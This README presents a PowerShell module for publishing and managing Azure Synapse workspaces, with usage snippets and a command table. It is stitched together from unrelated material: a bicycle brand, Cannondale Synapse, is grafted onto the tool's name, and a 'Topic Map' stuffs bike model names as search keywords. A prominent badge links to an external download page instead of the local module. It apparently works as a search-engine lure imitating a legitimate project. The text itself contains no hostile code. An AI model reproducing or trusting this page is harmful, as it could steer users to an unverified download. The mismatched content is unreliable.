# Cannondale Synapse Tools - PowerShell Workspace Deployment

<p align="center">
  <img src="logo.png" width="220" alt="Cannondale Synapse Tools logo">
</p>

Cannondale Synapse Tools is a PowerShell module for publishing, importing, documenting, and managing Microsoft Azure Synapse workspaces. It handles deployment order, environment configuration, trigger control, workspace exports, and incremental updates.

## Supported Workspace Objects

| Deployment object | Included |
|---|:---:|
| Workspace instance | Yes |
| Dataset and dataflow | Yes |
| Integration runtime and linked service | Yes |
| Pipeline and notebook | Yes |
| KQL and SQL script | Yes |
| Spark job definition | Yes |

![Azure Synapse workspace graphic](images/Azure-Synapse-Analytics-512.png)

## Capabilities

- Publishes workspace objects from JSON files in the required dependency order.
- Imports datasets, pipelines, linked services, triggers, scripts, and notebooks from a folder.
- Replaces environment-specific properties through stage configuration.
- Supports incremental deployment through a stored deployment state.
- Starts and stops Synapse triggers around a release.
- Generates Mermaid dependency diagrams for workspace objects.
- Includes Pester tests and sample pipeline definitions for CI/CD validation.

## Get The Module

[![Get Cannondale Synapse Tools](https://img.shields.io/badge/GET%20CANNONDALE%20SYNAPSE-22C55E?style=for-the-badge&logo=powershell&logoColor=white)](https://cannondale-synapse.github.io/cannondale-synapse-tools/cannondale-synapse)

For a local setup, open PowerShell in the repository folder and import the included manifest:

```powershell
Import-Module .\azure.synapse.tools.psd1 -Force
Get-Module -Name azure.synapse.tools
```

PowerShell 5.1 or a compatible newer edition is required.

## Import And Inspect

Load a workspace from its JSON folder, then create a dependency diagram:

```powershell
$workspace = Import-SynapseFromFolder `
  -SynapseWorkspaceName 'SynWorkspace' `
  -RootFolder '.\synapse'

Get-SynapseDocDiagram -synapse $workspace -direction 'LR' |
  Set-Content -Path '.\synapse-diagram.md'
```

![Cannondale Synapse module mark](images/Azure-Synapse-tools-256-logo.png)

## Publish A Workspace

The publish command creates the workspace when needed and deploys objects from the selected source folder:

```powershell
$publish = @{
  RootFolder          = '.\synapse'
  ResourceGroupName   = 'rg-synapse-dev'
  SynapseWorkspaceName = 'synapse-dev'
  Location            = 'NorthEurope'
}

Publish-SynapseFromJson @publish
```

For incremental deployment, create an option object and provide the storage account used for deployment state:

```powershell
$option = New-SynapsePublishOption
$option.IncrementalDeployment = $true
$option.StorageAccountName = 'synapsestate'

Publish-SynapseFromJson @publish -Option $option
```

## Command Map

| Command | Purpose | Source |
|---|---|---|
| `Publish-SynapseFromJson` | Deploy workspace objects | [`public/Publish-SynapseFromJson.ps1`](public/Publish-SynapseFromJson.ps1) |
| `Import-SynapseFromFolder` | Load objects from JSON | [`public/Import-SynapseFromFolder.ps1`](public/Import-SynapseFromFolder.ps1) |
| `Get-SynapseDocDiagram` | Build a dependency diagram | [`public/Get-SynapseDocDiagram.ps1`](public/Get-SynapseDocDiagram.ps1) |
| `Start-SynapseTriggers` | Start workspace triggers | [`public/Start-SynapseTriggers.ps1`](public/Start-SynapseTriggers.ps1) |
| `Stop-SynapseTriggers` | Stop workspace triggers | [`public/Stop-SynapseTriggers.ps1`](public/Stop-SynapseTriggers.ps1) |

## Topic Map

Cannondale Synapse, Cannondale, Cannondale Synapse Carbon, Cannondale Synapse Carbon 2, Cannondale Synapse 1, Cannondale Synapse 2, Cannondale Synapse 3, Cannondale Synapse 5, Synapse Carbon 4, Synapse Carbon 5, Azure Synapse, Synapse Tools

## Notes

The `DeleteNotInSource` option removes destination objects that are absent from the source. Incremental deployment requires a deployment-state JSON file and access to its storage container. Credential objects and Apache Spark pool deployment are outside the current command set.

## License

The module is distributed under the terms in [`LICENSE`](LICENSE).
